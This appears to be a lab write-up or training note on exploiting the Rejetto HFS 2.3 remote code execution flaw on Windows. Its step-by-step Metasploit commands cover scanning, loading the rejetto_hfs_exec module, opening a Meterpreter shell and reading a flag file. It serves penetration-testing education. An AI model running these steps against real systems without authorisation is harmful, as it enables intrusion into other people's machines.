# Exploiting Windows

## Exploiting a Vulnerable HTTP File Server (HFS)

### Overview

- **HTTP File Server (HFS)**: A web server designed for file and document sharing.
- **Communication**: Typically runs on **TCP port 80** and uses the **HTTP protocol**.
- **Rejetto HFS**: A free, open-source HTTP file server for both **Windows** and **Linux**.
- **Vulnerability**: Version 2.3 of Rejetto HFS is vulnerable to **Remote Code Execution (RCE)**.
- **Exploit Module**: Metasploit (MSF) provides an exploit module to target this vulnerability and gain access to the system running HFS.

### Demo: Exploiting a Vulnerable HTTP File Server

Start the Metasploit service and PostgreSQL database:

```bash
service postgresql start && msfconsole
```

Verify the database connection:

```bash
db_status
```

Create a new workspace for organizing the attack:

```bash
workspace -a HFS
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

We perform an Nmap scan, identifying open ports, services, and the operating system. The scan results are stored directly in the Metasploit database:

```bash
db_nmap -sS -sV -O [targetIP]
```

We search for the **Rejetto HFS** exploit module in Metasploit:

```bash
search type:exploit name:rejetto
```

We use the exploit module for the Rejetto HFS vulnerability:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Display the options available for this exploit to ensure proper configuration:

```bash
show options
```

Retrieve detailed information about the exploit module:

```bash
info
```

Run the exploit to execute the attack and gain access to the target system:

```bash
run
```

### Post-Exploitation: Meterpreter Session

After a successful exploit, interact with the target system through a Meterpreter session.

Open a shell on the compromised system:

```bash
shell
```

Navigate to the root directory:

```bash
cd /
```

List the contents of the current directory:

```bash
dir
```

Read the content of the flag file:

```bash
type flag.txt
```

### Conclusion

Using Metasploit, we successfully exploited the vulnerable HTTP File Server running on the target system by leveraging the **Rejetto HFS Remote Code Execution exploit**.
